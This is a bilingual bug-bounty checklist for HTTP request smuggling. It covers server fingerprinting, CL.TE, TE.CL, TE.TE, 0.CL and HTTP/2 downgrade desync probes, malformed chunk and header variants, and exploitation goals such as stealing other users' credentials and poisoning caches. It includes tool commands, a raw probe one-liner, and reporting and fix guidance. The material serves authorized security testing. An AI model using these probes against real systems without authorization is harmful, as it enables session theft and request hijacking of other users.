---
id: clk-http-request-smuggling
title: HTTP Request Smuggling
owasp_anchor: [WSTG-CONF, WSTG-INPV]
cwe: [CWE-444]
severity_typical: P1
playbook: playbooks/smuggling.yaml
last_updated: 2026-05-14
sources: []
maturity: stable
---

# HTTP Request Smuggling Checklist

> 双语 / Bilingual：从经典 CL.TE / TE.CL，到 HTTP/2 downgrade、0.CL、Funky Chunks。
> 用法：先做"前后端解析器指纹"，再按 desync 类型逐一探测；任何 desync 必须严格用受控 collaborator + cache buster 验证，避免影响他人请求。
> Authorization-only：所有 desync PoC 都必须用自己注册的账号承接被走私的请求；禁止跨用户证明。

---

## 1. Recon & 前后端指纹

- [ ] 抓 `Server` / `Via` / `X-Cache` / `X-Forwarded-By` / `cf-ray` / `X-Akamai-*`，识别前端与回源
- [ ] 标记常见组合：CF→Origin、Akamai→Kestrel、ALB→Nginx、Apache→Tomcat、Pingora→上游
- [ ] 看是否存在 HTTP/2 前端 + HTTP/1.1 回源（H2 downgrade 必备条件）
- [ ] 抓响应是否带 `Connection: keep-alive`、`HTTP/1.1`，确认连接复用
- [ ] 用 `OPTIONS *` / `TRACE` 看后端类型（很多 Tomcat / Jetty / IIS / Kestrel 会暴露版本）
- [ ] 标记历史 CVE 类适用范围：[example: CVE-XXXX-YYYY 类] Akamai chunk 解析、IIS chunk-extension、Kestrel CL 截断

## 2. 经典 HTTP/1.1 desync

### 2.1 CL.TE
- [ ] 同时发 `Content-Length` 与 `Transfer-Encoding: chunked`，前端按 CL 读，后端按 TE 读
- [ ] 标准探针：`Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG`
- [ ] 测时间盲：让走私部分进入慢路径，观察后续请求 RTT 抖动

### 2.2 TE.CL
- [ ] 前端 TE，后端 CL：`Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST...`
- [ ] 后端读 CL=4 截断，多余字节作为下一请求

### 2.3 TE.TE（duplicate / obfuscated TE）
- [ ] 测各种 TE obfuscation：
  - `Transfer-Encoding: xchunked`
  - `Transfer-Encoding : chunked`（空格）
  - `Transfer-Encoding:chunked`（无空格）
  - `Transfer-Encoding: chunked\r\nTransfer-encoding: x`（大小写）
  - `Transfer-Encoding\x0b: chunked`（垂直制表符）
  - `Transfer-Encoding: "chunked"`（引号）

### 2.4 0.CL
- [ ] 前端忽略 body（认为 CL=0），后端按 CL 读 → 走私
- [ ] 触发条件：前端按 RFC 严格、后端宽松；或反之
- [ ] 配合 GET-with-body / OPTIONS-with-body 测试

## 3. HTTP/2 相关 desync

### 3.1 H2.CL / H2.TE downgrade
- [ ] 前端接受 HTTP/2，回源转成 HTTP/1.1，把 `:method`、`:path`、`content-length`、`transfer-encoding` 拼回去
- [ ] H2.CL：在 H2 frame 里指定 content-length，前端 downgrade 后保留 CL，后端按 CL 读，前端按 H2 frame 长度读 → desync
- [ ] H2.TE：H2 请求里塞 `transfer-encoding: chunked` 头（H2 应禁但很多前端透传）

### 3.2 H2 request splitting via header injection
- [ ] H2 header value 中塞 `\r\n` / `\n` / `\0` 等，downgrade 后变成新行
- [ ] `:path` 中塞 `\r\n` 触发 path 拆分
- [ ] pseudo-header 顺序错乱、重复 `:authority`

### 3.3 H2 trailer / continuation
- [ ] HEADERS + CONTINUATION frame 切分时前端截断
- [ ] H2 trailer 头中塞控制头 `host` / `content-length` 让 downgrade 后注入

### 3.4 HTTP/3 / QUIC
- [ ] H3 → H2 → H1 多级 downgrade 时的解析差异
- [ ] QUIC 0-RTT replay 是否被去重（与 smuggling 链路相关）

## 4. Funky Chunks & 边角

- [ ] chunk-size 大小写：`5C` vs `5c`、前导零 `0005`、`+5`
- [ ] chunk-extension 注入：`5;name=value\r\n...`
- [ ] chunk trailer header 中塞 `Host: evil`
- [ ] 末尾 `0\r\n` 后多塞 `\r\nGET ...`，部分前端忽略 trailer
- [ ] CRLF 异型：单 `\n`、单 `\r`、`\r\r\n`、`\n\r\n`
- [ ] body 长度欺骗：`Content-Length: 010`（八进制）、`Content-Length: 5,5`、`Content-Length: 5\r\nContent-Length: 6`
- [ ] header name 异型：`Content-Length\t:`、`Content-Length\x00:`、`Content_Length:`
- [ ] connection 头注入：`Connection: keep-alive, X-Internal-Header` 让回源剥头规则错乱

## 5. 历史厂商类（参考向量族）

- [ ] Akamai chunk-extension 类 [example: 历史 Akamai chunk 漏洞类]
- [ ] IIS chunk truncation 类
- [ ] Kestrel HTTP/2 CL 截断类
- [ ] HAProxy `\0` header 注入类
- [ ] Apache mod_proxy `Transfer-Encoding` 透传类
- [ ] Nginx `Content-Length` 多头取首类
- [ ] Pingora downgrade 类 [example: 历史 Pingora 类]

## 6. 利用方向（链 desync 后能做什么）

- [ ] 偷取下一请求 Authorization / Cookie：走私 `POST /collab` 让受害者请求 body 拼到本地 echo 端点
- [ ] 队列毒化：走私的 prefix 让后续真实请求落到攻击者控制的路径
- [ ] 缓存毒化：smuggling + cache deception 链
- [ ] 绕过前端 WAF / Auth：走私的内部请求绕过前端鉴权
- [ ] 内部 API 触达：通过走私调用前端不暴露的内网路径

## 7. 自动化辅助

```bash
# HTTP Request Smuggler (Burp ext) 主力工具
# https://github.com/PortSwigger/http-request-smuggler

# smuggler.py（defparam）
git clone https://github.com/defparam/smuggler && cd smuggler
python3 smuggler.py -u https://target -q 1 -t 5 -m exhaustive

# h2cSmuggler / h2csmuggler 测 HTTP/2 over cleartext upgrade
python3 h2csmuggler.py -x https://target -u http://internal/admin

# 手测 CL.TE 探针（time-based）
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' \
  | openssl s_client -quiet -connect target:443

# Burp Bambda：标记疑似 desync 响应
# response.statusCode() == 0 || response.timeTaken() > 5000

# Caido workflow：把每条候选 payload 串到 collab，自动比对 baseline
# 用 HTTPQL: req.path.cont("smuggle-marker") AND resp.body.cont("collab-id")

# Nuclei 模板
nuclei -tags smuggling,desync,h2c -u https://target
```

## 8. Reporting Angle

* **Title 模板**：`HTTP Request Smuggling (<class>) on <front-end>→<back-end> allows <impact>`
* **CVSS 3.1 区间**：
  * 完整 desync 偷取他人请求 / 注入响应：8.6 – 9.8（S:C/C:H/I:H）
  * 仅触发 desync 但未利用：5.3 – 6.5
* **VRT P-level**：可用于 ATO / 偷 Authorization → P1；纯 desync demo → P2
* **CWE 推荐**：CWE-444（Inconsistent Interpretation of HTTP Requests）
* **PoC 必须**：
  - 两个测试账号、cache-buster 路径、请求间隔 < keep-alive
  - 把 desync 命中标记打在攻击者自有路径，不影响真实用户
  - 完整 wire bytes（hexdump）和 timing 截图
* **Suggested Fix**（≥2）：
  1. 前端启用 HTTP/2 端到端，禁止 downgrade 至 HTTP/1.1
  2. 严格按 RFC 7230 拒绝同时存在 CL 与 TE，丢弃异型头
  3. 边缘禁用连接复用（每请求独立连接）
  4. WAF 层加 desync 探针签名 + 行为基线告警

## 9. 已迁移技法（来自 KB）

- [[techniques/cl_te_classic|CL.TE / TE.CL 经典族]]
- [[techniques/h2_downgrade_smuggling|H2 Downgrade Smuggling]]
- [[techniques/funky_chunks|Funky Chunks 异型解析]]
- [[techniques/zero_cl_smuggling|0.CL 类]]
